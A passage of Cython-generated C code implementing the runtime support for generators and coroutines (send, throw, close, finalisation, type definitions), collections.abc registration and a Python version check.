    CYTHON_MAYBE_UNUSED_VAR(gen);
    if (unlikely(!retval)) {
        __Pyx_PyThreadState_declare
        __Pyx_PyThreadState_assign
        if (!__Pyx_PyErr_Occurred()) {
            PyObject *exc = PyExc_StopIteration;
            #ifdef __Pyx_AsyncGen_USED
            if (__Pyx_AsyncGen_CheckExact(gen))
                exc = __Pyx_PyExc_StopAsyncIteration;
            #endif
            __Pyx_PyErr_SetNone(exc);
        }
    }
    return retval;
}
#if CYTHON_COMPILING_IN_CPYTHON && PY_VERSION_HEX >= 0x03030000 && (defined(__linux__) || PY_VERSION_HEX >= 0x030600B3)
static CYTHON_INLINE
PyObject *__Pyx_PyGen_Send(PyGenObject *gen, PyObject *arg) {
#if PY_VERSION_HEX <= 0x030A00A1
    return _PyGen_Send(gen, arg);
#else
    PyObject *result;
    if (PyIter_Send((PyObject*)gen, arg ? arg : Py_None, &result) == PYGEN_RETURN) {
        if (PyAsyncGen_CheckExact(gen)) {
            assert(result == Py_None);
            PyErr_SetNone(PyExc_StopAsyncIteration);
        }
        else if (result == Py_None) {
            PyErr_SetNone(PyExc_StopIteration);
        }
        else {
#if PY_VERSION_HEX < 0x030d00A1
            _PyGen_SetStopIterationValue(result);
#else
            if (!PyTuple_Check(result) && !PyExceptionInstance_Check(result)) {
                PyErr_SetObject(PyExc_StopIteration, result);
            } else {
                PyObject *exc = __Pyx_PyObject_CallOneArg(PyExc_StopIteration, result);
                if (likely(exc != NULL)) {
                    PyErr_SetObject(PyExc_StopIteration, exc);
                    Py_DECREF(exc);
                }
            }
#endif
        }
        Py_DECREF(result);
        result = NULL;
    }
    return result;
#endif
}
#endif
static CYTHON_INLINE
PyObject *__Pyx_Coroutine_FinishDelegation(__pyx_CoroutineObject *gen) {
    PyObject *ret;
    PyObject *val = NULL;
    __Pyx_Coroutine_Undelegate(gen);
    __Pyx_PyGen__FetchStopIterationValue(__Pyx_PyThreadState_Current, &val);
    ret = __Pyx_Coroutine_SendEx(gen, val, 0);
    Py_XDECREF(val);
    return ret;
}
static PyObject *__Pyx_Coroutine_Send(PyObject *self, PyObject *value) {
    PyObject *retval;
    __pyx_CoroutineObject *gen = (__pyx_CoroutineObject*) self;
    PyObject *yf = gen->yieldfrom;
    if (unlikely(gen->is_running))
        return __Pyx_Coroutine_AlreadyRunningError(gen);
    if (yf) {
        PyObject *ret;
        gen->is_running = 1;
        #ifdef __Pyx_Generator_USED
        if (__Pyx_Generator_CheckExact(yf)) {
            ret = __Pyx_Coroutine_Send(yf, value);
        } else
        #endif
        #ifdef __Pyx_Coroutine_USED
        if (__Pyx_Coroutine_Check(yf)) {
            ret = __Pyx_Coroutine_Send(yf, value);
        } else
        #endif
        #ifdef __Pyx_AsyncGen_USED
        if (__pyx_PyAsyncGenASend_CheckExact(yf)) {
            ret = __Pyx_async_gen_asend_send(yf, value);
        } else
        #endif
        #if CYTHON_COMPILING_IN_CPYTHON && PY_VERSION_HEX >= 0x03030000 && (defined(__linux__) || PY_VERSION_HEX >= 0x030600B3)
        if (PyGen_CheckExact(yf)) {
            ret = __Pyx_PyGen_Send((PyGenObject*)yf, value == Py_None ? NULL : value);
        } else
        #endif
        #if CYTHON_COMPILING_IN_CPYTHON && PY_VERSION_HEX >= 0x03050000 && defined(PyCoro_CheckExact) && (defined(__linux__) || PY_VERSION_HEX >= 0x030600B3)
        if (PyCoro_CheckExact(yf)) {
            ret = __Pyx_PyGen_Send((PyGenObject*)yf, value == Py_None ? NULL : value);
        } else
        #endif
        {
            if (value == Py_None)
                ret = __Pyx_PyObject_GetIterNextFunc(yf)(yf);
            else
                ret = __Pyx_PyObject_CallMethod1(yf, __pyx_n_s_send, value);
        }
        gen->is_running = 0;
        if (likely(ret)) {
            return ret;
        }
        retval = __Pyx_Coroutine_FinishDelegation(gen);
    } else {
        retval = __Pyx_Coroutine_SendEx(gen, value, 0);
    }
    return __Pyx_Coroutine_MethodReturn(self, retval);
}
static int __Pyx_Coroutine_CloseIter(__pyx_CoroutineObject *gen, PyObject *yf) {
    PyObject *retval = NULL;
    int err = 0;
    #ifdef __Pyx_Generator_USED
    if (__Pyx_Generator_CheckExact(yf)) {
        retval = __Pyx_Coroutine_Close(yf);
        if (!retval)
            return -1;
    } else
    #endif
    #ifdef __Pyx_Coroutine_USED
    if (__Pyx_Coroutine_Check(yf)) {
        retval = __Pyx_Coroutine_Close(yf);
        if (!retval)
            return -1;
    } else
    if (__Pyx_CoroutineAwait_CheckExact(yf)) {
        retval = __Pyx_CoroutineAwait_Close((__pyx_CoroutineAwaitObject*)yf, NULL);
        if (!retval)
            return -1;
    } else
    #endif
    #ifdef __Pyx_AsyncGen_USED
    if (__pyx_PyAsyncGenASend_CheckExact(yf)) {
        retval = __Pyx_async_gen_asend_close(yf, NULL);
    } else
    if (__pyx_PyAsyncGenAThrow_CheckExact(yf)) {
        retval = __Pyx_async_gen_athrow_close(yf, NULL);
    } else
    #endif
    {
        PyObject *meth;
        gen->is_running = 1;
        meth = __Pyx_PyObject_GetAttrStrNoError(yf, __pyx_n_s_close);
        if (unlikely(!meth)) {
            if (unlikely(PyErr_Occurred())) {
                PyErr_WriteUnraisable(yf);
            }
        } else {
            retval = __Pyx_PyObject_CallNoArg(meth);
            Py_DECREF(meth);
            if (unlikely(!retval))
                err = -1;
        }
        gen->is_running = 0;
    }
    Py_XDECREF(retval);
    return err;
}
static PyObject *__Pyx_Generator_Next(PyObject *self) {
    __pyx_CoroutineObject *gen = (__pyx_CoroutineObject*) self;
    PyObject *yf = gen->yieldfrom;
    if (unlikely(gen->is_running))
        return __Pyx_Coroutine_AlreadyRunningError(gen);
    if (yf) {
        PyObject *ret;
        gen->is_running = 1;
        #ifdef __Pyx_Generator_USED
        if (__Pyx_Generator_CheckExact(yf)) {
            ret = __Pyx_Generator_Next(yf);
        } else
        #endif
        #if CYTHON_COMPILING_IN_CPYTHON && PY_VERSION_HEX >= 0x03030000 && (defined(__linux__) || PY_VERSION_HEX >= 0x030600B3)
        if (PyGen_CheckExact(yf)) {
            ret = __Pyx_PyGen_Send((PyGenObject*)yf, NULL);
        } else
        #endif
        #ifdef __Pyx_Coroutine_USED
        if (__Pyx_Coroutine_Check(yf)) {
            ret = __Pyx_Coroutine_Send(yf, Py_None);
        } else
        #endif
            ret = __Pyx_PyObject_GetIterNextFunc(yf)(yf);
        gen->is_running = 0;
        if (likely(ret)) {
            return ret;
        }
        return __Pyx_Coroutine_FinishDelegation(gen);
    }
    return __Pyx_Coroutine_SendEx(gen, Py_None, 0);
}
static PyObject *__Pyx_Coroutine_Close_Method(PyObject *self, PyObject *arg) {
    CYTHON_UNUSED_VAR(arg);
    return __Pyx_Coroutine_Close(self);
}
static PyObject *__Pyx_Coroutine_Close(PyObject *self) {
    __pyx_CoroutineObject *gen = (__pyx_CoroutineObject *) self;
    PyObject *retval, *raised_exception;
    PyObject *yf = gen->yieldfrom;
    int err = 0;
    if (unlikely(gen->is_running))
        return __Pyx_Coroutine_AlreadyRunningError(gen);
    if (yf) {
        Py_INCREF(yf);
        err = __Pyx_Coroutine_CloseIter(gen, yf);
        __Pyx_Coroutine_Undelegate(gen);
        Py_DECREF(yf);
    }
    if (err == 0)
        PyErr_SetNone(PyExc_GeneratorExit);
    retval = __Pyx_Coroutine_SendEx(gen, NULL, 1);
    if (unlikely(retval)) {
        const char *msg;
        Py_DECREF(retval);
        if ((0)) {
        #ifdef __Pyx_Coroutine_USED
        } else if (__Pyx_Coroutine_Check(self)) {
            msg = "coroutine ignored GeneratorExit";
        #endif
        #ifdef __Pyx_AsyncGen_USED
        } else if (__Pyx_AsyncGen_CheckExact(self)) {
#if PY_VERSION_HEX < 0x03060000
            msg = "async generator ignored GeneratorExit - might require Python 3.6+ finalisation (PEP 525)";
#else
            msg = "async generator ignored GeneratorExit";
#endif
        #endif
        } else {
            msg = "generator ignored GeneratorExit";
        }
        PyErr_SetString(PyExc_RuntimeError, msg);
        return NULL;
    }
    raised_exception = PyErr_Occurred();
    if (likely(!raised_exception || __Pyx_PyErr_GivenExceptionMatches2(raised_exception, PyExc_GeneratorExit, PyExc_StopIteration))) {
        if (raised_exception) PyErr_Clear();
        Py_INCREF(Py_None);
        return Py_None;
    }
    return NULL;
}
static PyObject *__Pyx__Coroutine_Throw(PyObject *self, PyObject *typ, PyObject *val, PyObject *tb,
                                        PyObject *args, int close_on_genexit) {
    __pyx_CoroutineObject *gen = (__pyx_CoroutineObject *) self;
    PyObject *yf = gen->yieldfrom;
    if (unlikely(gen->is_running))
        return __Pyx_Coroutine_AlreadyRunningError(gen);
    if (yf) {
        PyObject *ret;
        Py_INCREF(yf);
        if (__Pyx_PyErr_GivenExceptionMatches(typ, PyExc_GeneratorExit) && close_on_genexit) {
            int err = __Pyx_Coroutine_CloseIter(gen, yf);
            Py_DECREF(yf);
            __Pyx_Coroutine_Undelegate(gen);
            if (err < 0)
                return __Pyx_Coroutine_MethodReturn(self, __Pyx_Coroutine_SendEx(gen, NULL, 0));
            goto throw_here;
        }
        gen->is_running = 1;
        if (0
        #ifdef __Pyx_Generator_USED
            || __Pyx_Generator_CheckExact(yf)
        #endif
        #ifdef __Pyx_Coroutine_USED
            || __Pyx_Coroutine_Check(yf)
        #endif
            ) {
            ret = __Pyx__Coroutine_Throw(yf, typ, val, tb, args, close_on_genexit);
        #ifdef __Pyx_Coroutine_USED
        } else if (__Pyx_CoroutineAwait_CheckExact(yf)) {
            ret = __Pyx__Coroutine_Throw(((__pyx_CoroutineAwaitObject*)yf)->coroutine, typ, val, tb, args, close_on_genexit);
        #endif
        } else {
            PyObject *meth = __Pyx_PyObject_GetAttrStrNoError(yf, __pyx_n_s_throw);
            if (unlikely(!meth)) {
                Py_DECREF(yf);
                if (unlikely(PyErr_Occurred())) {
                    gen->is_running = 0;
                    return NULL;
                }
                __Pyx_Coroutine_Undelegate(gen);
                gen->is_running = 0;
                goto throw_here;
            }
            if (likely(args)) {
                ret = __Pyx_PyObject_Call(meth, args, NULL);
            } else {
                PyObject *cargs[4] = {NULL, typ, val, tb};
                ret = __Pyx_PyObject_FastCall(meth, cargs+1, 3 | __Pyx_PY_VECTORCALL_ARGUMENTS_OFFSET);
            }
            Py_DECREF(meth);
        }
        gen->is_running = 0;
        Py_DECREF(yf);
        if (!ret) {
            ret = __Pyx_Coroutine_FinishDelegation(gen);
        }
        return __Pyx_Coroutine_MethodReturn(self, ret);
    }
throw_here:
    __Pyx_Raise(typ, val, tb, NULL);
    return __Pyx_Coroutine_MethodReturn(self, __Pyx_Coroutine_SendEx(gen, NULL, 0));
}
static PyObject *__Pyx_Coroutine_Throw(PyObject *self, PyObject *args) {
    PyObject *typ;
    PyObject *val = NULL;
    PyObject *tb = NULL;
    if (unlikely(!PyArg_UnpackTuple(args, (char *)"throw", 1, 3, &typ, &val, &tb)))
        return NULL;
    return __Pyx__Coroutine_Throw(self, typ, val, tb, args, 1);
}
static CYTHON_INLINE int __Pyx_Coroutine_traverse_excstate(__Pyx_ExcInfoStruct *exc_state, visitproc visit, void *arg) {
#if PY_VERSION_HEX >= 0x030B00a4
    Py_VISIT(exc_state->exc_value);
#else
    Py_VISIT(exc_state->exc_type);
    Py_VISIT(exc_state->exc_value);
    Py_VISIT(exc_state->exc_traceback);
#endif
    return 0;
}
static int __Pyx_Coroutine_traverse(__pyx_CoroutineObject *gen, visitproc visit, void *arg) {
    Py_VISIT(gen->closure);
    Py_VISIT(gen->classobj);
    Py_VISIT(gen->yieldfrom);
    return __Pyx_Coroutine_traverse_excstate(&gen->gi_exc_state, visit, arg);
}
static int __Pyx_Coroutine_clear(PyObject *self) {
    __pyx_CoroutineObject *gen = (__pyx_CoroutineObject *) self;
    Py_CLEAR(gen->closure);
    Py_CLEAR(gen->classobj);
    Py_CLEAR(gen->yieldfrom);
    __Pyx_Coroutine_ExceptionClear(&gen->gi_exc_state);
#ifdef __Pyx_AsyncGen_USED
    if (__Pyx_AsyncGen_CheckExact(self)) {
        Py_CLEAR(((__pyx_PyAsyncGenObject*)gen)->ag_finalizer);
    }
#endif
    Py_CLEAR(gen->gi_code);
    Py_CLEAR(gen->gi_frame);
    Py_CLEAR(gen->gi_name);
    Py_CLEAR(gen->gi_qualname);
    Py_CLEAR(gen->gi_modulename);
    return 0;
}
static void __Pyx_Coroutine_dealloc(PyObject *self) {
    __pyx_CoroutineObject *gen = (__pyx_CoroutineObject *) self;
    PyObject_GC_UnTrack(gen);
    if (gen->gi_weakreflist != NULL)
        PyObject_ClearWeakRefs(self);
    if (gen->resume_label >= 0) {
        PyObject_GC_Track(self);
#if PY_VERSION_HEX >= 0x030400a1 && CYTHON_USE_TP_FINALIZE
        if (unlikely(PyObject_CallFinalizerFromDealloc(self)))
#else
        Py_TYPE(gen)->tp_del(self);
        if (unlikely(Py_REFCNT(self) > 0))
#endif
        {
            return;
        }
        PyObject_GC_UnTrack(self);
    }
#ifdef __Pyx_AsyncGen_USED
    if (__Pyx_AsyncGen_CheckExact(self)) {
        /* We have to handle this case for asynchronous generators
           right here, because this code has to be between UNTRACK
           and GC_Del. */
        Py_CLEAR(((__pyx_PyAsyncGenObject*)self)->ag_finalizer);
    }
#endif
    __Pyx_Coroutine_clear(self);
    __Pyx_PyHeapTypeObject_GC_Del(gen);
}
static void __Pyx_Coroutine_del(PyObject *self) {
    PyObject *error_type, *error_value, *error_traceback;
    __pyx_CoroutineObject *gen = (__pyx_CoroutineObject *) self;
    __Pyx_PyThreadState_declare
    if (gen->resume_label < 0) {
        return;
    }
#if !CYTHON_USE_TP_FINALIZE
    assert(self->ob_refcnt == 0);
    __Pyx_SET_REFCNT(self, 1);
#endif
    __Pyx_PyThreadState_assign
    __Pyx_ErrFetch(&error_type, &error_value, &error_traceback);
#ifdef __Pyx_AsyncGen_USED
    if (__Pyx_AsyncGen_CheckExact(self)) {
        __pyx_PyAsyncGenObject *agen = (__pyx_PyAsyncGenObject*)self;
        PyObject *finalizer = agen->ag_finalizer;
        if (finalizer && !agen->ag_closed) {
            PyObject *res = __Pyx_PyObject_CallOneArg(finalizer, self);
            if (unlikely(!res)) {
                PyErr_WriteUnraisable(self);
            } else {
                Py_DECREF(res);
            }
            __Pyx_ErrRestore(error_type, error_value, error_traceback);
            return;
        }
    }
#endif
    if (unlikely(gen->resume_label == 0 && !error_value)) {
#ifdef __Pyx_Coroutine_USED
#ifdef __Pyx_Generator_USED
    if (!__Pyx_Generator_CheckExact(self))
#endif
        {
        PyObject_GC_UnTrack(self);
#if PY_MAJOR_VERSION >= 3  || defined(PyErr_WarnFormat)
        if (unlikely(PyErr_WarnFormat(PyExc_RuntimeWarning, 1, "coroutine '%.50S' was never awaited", gen->gi_qualname) < 0))
            PyErr_WriteUnraisable(self);
#else
        {PyObject *msg;
        char *cmsg;
        #if CYTHON_COMPILING_IN_PYPY
        msg = NULL;
        cmsg = (char*) "coroutine was never awaited";
        #else
        char *cname;
        PyObject *qualname;
        qualname = gen->gi_qualname;
        cname = PyString_AS_STRING(qualname);
        msg = PyString_FromFormat("coroutine '%.50s' was never awaited", cname);
        if (unlikely(!msg)) {
            PyErr_Clear();
            cmsg = (char*) "coroutine was never awaited";
        } else {
            cmsg = PyString_AS_STRING(msg);
        }
        #endif
        if (unlikely(PyErr_WarnEx(PyExc_RuntimeWarning, cmsg, 1) < 0))
            PyErr_WriteUnraisable(self);
        Py_XDECREF(msg);}
#endif
        PyObject_GC_Track(self);
        }
#endif
    } else {
        PyObject *res = __Pyx_Coroutine_Close(self);
        if (unlikely(!res)) {
            if (PyErr_Occurred())
                PyErr_WriteUnraisable(self);
        } else {
            Py_DECREF(res);
        }
    }
    __Pyx_ErrRestore(error_type, error_value, error_traceback);
#if !CYTHON_USE_TP_FINALIZE
    assert(Py_REFCNT(self) > 0);
    if (likely(--self->ob_refcnt == 0)) {
        return;
    }
    {
        Py_ssize_t refcnt = Py_REFCNT(self);
        _Py_NewReference(self);
        __Pyx_SET_REFCNT(self, refcnt);
    }
#if CYTHON_COMPILING_IN_CPYTHON
    assert(PyType_IS_GC(Py_TYPE(self)) &&
           _Py_AS_GC(self)->gc.gc_refs != _PyGC_REFS_UNTRACKED);
    _Py_DEC_REFTOTAL;
#endif
#ifdef COUNT_ALLOCS
    --Py_TYPE(self)->tp_frees;
    --Py_TYPE(self)->tp_allocs;
#endif
#endif
}
static PyObject *
__Pyx_Coroutine_get_name(__pyx_CoroutineObject *self, void *context)
{
    PyObject *name = self->gi_name;
    CYTHON_UNUSED_VAR(context);
    if (unlikely(!name)) name = Py_None;
    Py_INCREF(name);
    return name;
}
static int
__Pyx_Coroutine_set_name(__pyx_CoroutineObject *self, PyObject *value, void *context)
{
    CYTHON_UNUSED_VAR(context);
#if PY_MAJOR_VERSION >= 3
    if (unlikely(value == NULL || !PyUnicode_Check(value)))
#else
    if (unlikely(value == NULL || !PyString_Check(value)))
#endif
    {
        PyErr_SetString(PyExc_TypeError,
                        "__name__ must be set to a string object");
        return -1;
    }
    Py_INCREF(value);
    __Pyx_Py_XDECREF_SET(self->gi_name, value);
    return 0;
}
static PyObject *
__Pyx_Coroutine_get_qualname(__pyx_CoroutineObject *self, void *context)
{
    PyObject *name = self->gi_qualname;
    CYTHON_UNUSED_VAR(context);
    if (unlikely(!name)) name = Py_None;
    Py_INCREF(name);
    return name;
}
static int
__Pyx_Coroutine_set_qualname(__pyx_CoroutineObject *self, PyObject *value, void *context)
{
    CYTHON_UNUSED_VAR(context);
#if PY_MAJOR_VERSION >= 3
    if (unlikely(value == NULL || !PyUnicode_Check(value)))
#else
    if (unlikely(value == NULL || !PyString_Check(value)))
#endif
    {
        PyErr_SetString(PyExc_TypeError,
                        "__qualname__ must be set to a string object");
        return -1;
    }
    Py_INCREF(value);
    __Pyx_Py_XDECREF_SET(self->gi_qualname, value);
    return 0;
}
static PyObject *
__Pyx_Coroutine_get_frame(__pyx_CoroutineObject *self, void *context)
{
    PyObject *frame = self->gi_frame;
    CYTHON_UNUSED_VAR(context);
    if (!frame) {
        if (unlikely(!self->gi_code)) {
            Py_RETURN_NONE;
        }
        frame = (PyObject *) PyFrame_New(
            PyThreadState_Get(),            /*PyThreadState *tstate,*/
            (PyCodeObject*) self->gi_code,  /*PyCodeObject *code,*/
            __pyx_d,                 /*PyObject *globals,*/
            0                               /*PyObject *locals*/
        );
        if (unlikely(!frame))
            return NULL;
        self->gi_frame = frame;
    }
    Py_INCREF(frame);
    return frame;
}
static __pyx_CoroutineObject *__Pyx__Coroutine_New(
            PyTypeObject* type, __pyx_coroutine_body_t body, PyObject *code, PyObject *closure,
            PyObject *name, PyObject *qualname, PyObject *module_name) {
    __pyx_CoroutineObject *gen = PyObject_GC_New(__pyx_CoroutineObject, type);
    if (unlikely(!gen))
        return NULL;
    return __Pyx__Coroutine_NewInit(gen, body, code, closure, name, qualname, module_name);
}
static __pyx_CoroutineObject *__Pyx__Coroutine_NewInit(
            __pyx_CoroutineObject *gen, __pyx_coroutine_body_t body, PyObject *code, PyObject *closure,
            PyObject *name, PyObject *qualname, PyObject *module_name) {
    gen->body = body;
    gen->closure = closure;
    Py_XINCREF(closure);
    gen->is_running = 0;
    gen->resume_label = 0;
    gen->classobj = NULL;
    gen->yieldfrom = NULL;
    #if PY_VERSION_HEX >= 0x030B00a4
    gen->gi_exc_state.exc_value = NULL;
    #else
    gen->gi_exc_state.exc_type = NULL;
    gen->gi_exc_state.exc_value = NULL;
    gen->gi_exc_state.exc_traceback = NULL;
    #endif
#if CYTHON_USE_EXC_INFO_STACK
    gen->gi_exc_state.previous_item = NULL;
#endif
    gen->gi_weakreflist = NULL;
    Py_XINCREF(qualname);
    gen->gi_qualname = qualname;
    Py_XINCREF(name);
    gen->gi_name = name;
    Py_XINCREF(module_name);
    gen->gi_modulename = module_name;
    Py_XINCREF(code);
    gen->gi_code = code;
    gen->gi_frame = NULL;
    PyObject_GC_Track(gen);
    return gen;
}

/* PatchModuleWithCoroutine */
static PyObject* __Pyx_Coroutine_patch_module(PyObject* module, const char* py_code) {
#if defined(__Pyx_Generator_USED) || defined(__Pyx_Coroutine_USED)
    int result;
    PyObject *globals, *result_obj;
    globals = PyDict_New();  if (unlikely(!globals)) goto ignore;
    result = PyDict_SetItemString(globals, "_cython_coroutine_type",
    #ifdef __Pyx_Coroutine_USED
        (PyObject*)__pyx_CoroutineType);
    #else
        Py_None);
    #endif
    if (unlikely(result < 0)) goto ignore;
    result = PyDict_SetItemString(globals, "_cython_generator_type",
    #ifdef __Pyx_Generator_USED
        (PyObject*)__pyx_GeneratorType);
    #else
        Py_None);
    #endif
    if (unlikely(result < 0)) goto ignore;
    if (unlikely(PyDict_SetItemString(globals, "_module", module) < 0)) goto ignore;
    if (unlikely(PyDict_SetItemString(globals, "__builtins__", __pyx_b) < 0)) goto ignore;
    result_obj = PyRun_String(py_code, Py_file_input, globals, globals);
    if (unlikely(!result_obj)) goto ignore;
    Py_DECREF(result_obj);
    Py_DECREF(globals);
    return module;
ignore:
    Py_XDECREF(globals);
    PyErr_WriteUnraisable(module);
    if (unlikely(PyErr_WarnEx(PyExc_RuntimeWarning, "Cython module failed to patch module with custom type", 1) < 0)) {
        Py_DECREF(module);
        module = NULL;
    }
#else
    py_code++;
#endif
    return module;
}

/* PatchGeneratorABC */
#ifndef CYTHON_REGISTER_ABCS
#define CYTHON_REGISTER_ABCS 1
#endif
#if defined(__Pyx_Generator_USED) || defined(__Pyx_Coroutine_USED)
static PyObject* __Pyx_patch_abc_module(PyObject *module);
static PyObject* __Pyx_patch_abc_module(PyObject *module) {
    module = __Pyx_Coroutine_patch_module(
        module, ""
"if _cython_generator_type is not None:\n"
"    try: Generator = _module.Generator\n"
"    except AttributeError: pass\n"
"    else: Generator.register(_cython_generator_type)\n"
"if _cython_coroutine_type is not None:\n"
"    try: Coroutine = _module.Coroutine\n"
"    except AttributeError: pass\n"
"    else: Coroutine.register(_cython_coroutine_type)\n"
    );
    return module;
}
#endif
static int __Pyx_patch_abc(void) {
#if defined(__Pyx_Generator_USED) || defined(__Pyx_Coroutine_USED)
    static int abc_patched = 0;
    if (CYTHON_REGISTER_ABCS && !abc_patched) {
        PyObject *module;
        module = PyImport_ImportModule((PY_MAJOR_VERSION >= 3) ? "collections.abc" : "collections");
        if (unlikely(!module)) {
            PyErr_WriteUnraisable(NULL);
            if (unlikely(PyErr_WarnEx(PyExc_RuntimeWarning,
                    ((PY_MAJOR_VERSION >= 3) ?
                        "Cython module failed to register with collections.abc module" :
                        "Cython module failed to register with collections module"), 1) < 0)) {
                return -1;
            }
        } else {
            module = __Pyx_patch_abc_module(module);
            abc_patched = 1;
            if (unlikely(!module))
                return -1;
            Py_DECREF(module);
        }
        module = PyImport_ImportModule("backports_abc");
        if (module) {
            module = __Pyx_patch_abc_module(module);
            Py_XDECREF(module);
        }
        if (!module) {
            PyErr_Clear();
        }
    }
#else
    if ((0)) __Pyx_Coroutine_patch_module(NULL, NULL);
#endif
    return 0;
}

/* Generator */
static PyMethodDef __pyx_Generator_methods[] = {
    {"send", (PyCFunction) __Pyx_Coroutine_Send, METH_O,
     (char*) PyDoc_STR("send(arg) -> send 'arg' into generator,\nreturn next yielded value or raise StopIteration.")},
    {"throw", (PyCFunction) __Pyx_Coroutine_Throw, METH_VARARGS,
     (char*) PyDoc_STR("throw(typ[,val[,tb]]) -> raise exception in generator,\nreturn next yielded value or raise StopIteration.")},
    {"close", (PyCFunction) __Pyx_Coroutine_Close_Method, METH_NOARGS,
     (char*) PyDoc_STR("close() -> raise GeneratorExit inside generator.")},
    {0, 0, 0, 0}
};
static PyMemberDef __pyx_Generator_memberlist[] = {
    {(char *) "gi_running", T_BOOL, offsetof(__pyx_CoroutineObject, is_running), READONLY, NULL},
    {(char*) "gi_yieldfrom", T_OBJECT, offsetof(__pyx_CoroutineObject, yieldfrom), READONLY,
     (char*) PyDoc_STR("object being iterated by 'yield from', or None")},
    {(char*) "gi_code", T_OBJECT, offsetof(__pyx_CoroutineObject, gi_code), READONLY, NULL},
    {(char *) "__module__", T_OBJECT, offsetof(__pyx_CoroutineObject, gi_modulename), 0, 0},
#if CYTHON_USE_TYPE_SPECS
    {(char *) "__weaklistoffset__", T_PYSSIZET, offsetof(__pyx_CoroutineObject, gi_weakreflist), READONLY, 0},
#endif
    {0, 0, 0, 0, 0}
};
static PyGetSetDef __pyx_Generator_getsets[] = {
    {(char *) "__name__", (getter)__Pyx_Coroutine_get_name, (setter)__Pyx_Coroutine_set_name,
     (char*) PyDoc_STR("name of the generator"), 0},
    {(char *) "__qualname__", (getter)__Pyx_Coroutine_get_qualname, (setter)__Pyx_Coroutine_set_qualname,
     (char*) PyDoc_STR("qualified name of the generator"), 0},
    {(char *) "gi_frame", (getter)__Pyx_Coroutine_get_frame, NULL,
     (char*) PyDoc_STR("Frame of the generator"), 0},
    {0, 0, 0, 0, 0}
};
#if CYTHON_USE_TYPE_SPECS
static PyType_Slot __pyx_GeneratorType_slots[] = {
    {Py_tp_dealloc, (void *)__Pyx_Coroutine_dealloc},
    {Py_tp_traverse, (void *)__Pyx_Coroutine_traverse},
    {Py_tp_iter, (void *)PyObject_SelfIter},
    {Py_tp_iternext, (void *)__Pyx_Generator_Next},
    {Py_tp_methods, (void *)__pyx_Generator_methods},
    {Py_tp_members, (void *)__pyx_Generator_memberlist},
    {Py_tp_getset, (void *)__pyx_Generator_getsets},
    {Py_tp_getattro, (void *) __Pyx_PyObject_GenericGetAttrNoDict},
#if CYTHON_USE_TP_FINALIZE
    {Py_tp_finalize, (void *)__Pyx_Coroutine_del},
#endif
    {0, 0},
};
static PyType_Spec __pyx_GeneratorType_spec = {
    __PYX_TYPE_MODULE_PREFIX "generator",
    sizeof(__pyx_CoroutineObject),
    0,
    Py_TPFLAGS_DEFAULT | Py_TPFLAGS_HAVE_GC | Py_TPFLAGS_HAVE_FINALIZE,
    __pyx_GeneratorType_slots
};
#else
static PyTypeObject __pyx_GeneratorType_type = {
    PyVarObject_HEAD_INIT(0, 0)
    __PYX_TYPE_MODULE_PREFIX "generator",
    sizeof(__pyx_CoroutineObject),
    0,
    (destructor) __Pyx_Coroutine_dealloc,
    0,
    0,
    0,
    0,
    0,
    0,
    0,
    0,
    0,
    0,
    0,
    0,
    0,
    0,
    Py_TPFLAGS_DEFAULT | Py_TPFLAGS_HAVE_GC | Py_TPFLAGS_HAVE_FINALIZE,
    0,
    (traverseproc) __Pyx_Coroutine_traverse,
    0,
    0,
    offsetof(__pyx_CoroutineObject, gi_weakreflist),
    0,
    (iternextfunc) __Pyx_Generator_Next,
    __pyx_Generator_methods,
    __pyx_Generator_memberlist,
    __pyx_Generator_getsets,
    0,
    0,
    0,
    0,
    0,
    0,
    0,
    0,
    0,
    0,
    0,
    0,
    0,
    0,
    0,
#if CYTHON_USE_TP_FINALIZE
    0,
#else
    __Pyx_Coroutine_del,
#endif
    0,
#if CYTHON_USE_TP_FINALIZE
    __Pyx_Coroutine_del,
#elif PY_VERSION_HEX >= 0x030400a1
    0,
#endif
#if PY_VERSION_HEX >= 0x030800b1 && (!CYTHON_COMPILING_IN_PYPY || PYPY_VERSION_NUM >= 0x07030800)
    0,
#endif
#if __PYX_NEED_TP_PRINT_SLOT
    0,
#endif
#if PY_VERSION_HEX >= 0x030C0000
    0,
#endif
#if CYTHON_COMPILING_IN_PYPY && PY_VERSION_HEX >= 0x03090000 && PY_VERSION_HEX < 0x030a0000
    0,
#endif
};
#endif
static int __pyx_Generator_init(PyObject *module) {
#if CYTHON_USE_TYPE_SPECS
    __pyx_GeneratorType = __Pyx_FetchCommonTypeFromSpec(module, &__pyx_GeneratorType_spec, NULL);
#else
    CYTHON_UNUSED_VAR(module);
    __pyx_GeneratorType_type.tp_getattro = __Pyx_PyObject_GenericGetAttrNoDict;
    __pyx_GeneratorType_type.tp_iter = PyObject_SelfIter;
    __pyx_GeneratorType = __Pyx_FetchCommonType(&__pyx_GeneratorType_type);
#endif
    if (unlikely(!__pyx_GeneratorType)) {
        return -1;
    }
    return 0;
}

/* CStringEquals */
static CYTHON_INLINE int __Pyx_StrEq(const char *s1, const char *s2) {
    while (*s1 != '\0' && *s1 == *s2) { s1++; s2++; }
    return *s1 == *s2;
}

/* CheckBinaryVersion */
static unsigned long __Pyx_get_runtime_version(void) {
#if __PYX_LIMITED_VERSION_HEX >= 0x030B00A4
    return Py_Version & ~0xFFUL;
#else
    const char* rt_version = Py_GetVersion();
    unsigned long version = 0;
    unsigned long factor = 0x01000000UL;
    unsigned int digit = 0;
    int i = 0;
    while (factor) {
        while ('0' <= rt_version[i] && rt_version[i] <= '9') {
            digit = digit * 10 + (unsigned int) (rt_version[i] - '0');
            ++i;
        }
        version += factor * digit;
        if (rt_version[i] != '.')
            break;
        digit = 0;
        factor >>= 8;
        ++i;
    }
    return version;
#endif
}
static int __Pyx_check_binary_version(unsigned long ct_version, unsigned long rt_version, int allow_newer) {
    const unsigned long MAJOR_MINOR = 0xFFFF0000UL;
    if ((rt_version & MAJOR_MINOR) == (ct_version & MAJOR_MINOR))
        return 0;
    if (likely(allow_newer && (rt_version & MAJOR_MINOR) > (ct_version & MAJOR_MINOR)))
        return 1;
    {
        char message[200];
        PyOS_snprintf(message, sizeof(message),
                      "compile time Python version %d.%d "
                      "of module '%.100s' "
                      "%s "
                      "runtime version %d.%d",
                       (int) (ct_version >> 24), (int) ((ct_version >> 16) & 0xFF),
                       __Pyx_MODULE_NAME,
                       (allow_newer) ? "was newer than" : "does not match",
                       (int) (rt_version >> 24), (int) ((rt_version >> 16) & 0xFF)
       );
        return PyErr_WarnEx(NULL, message, 1);
    }
}

/* InitStrings */
#if PY_MAJOR_VERSION >= 3
static int __Pyx_InitString(__Pyx_StringTabEntry t, PyObject **str) {
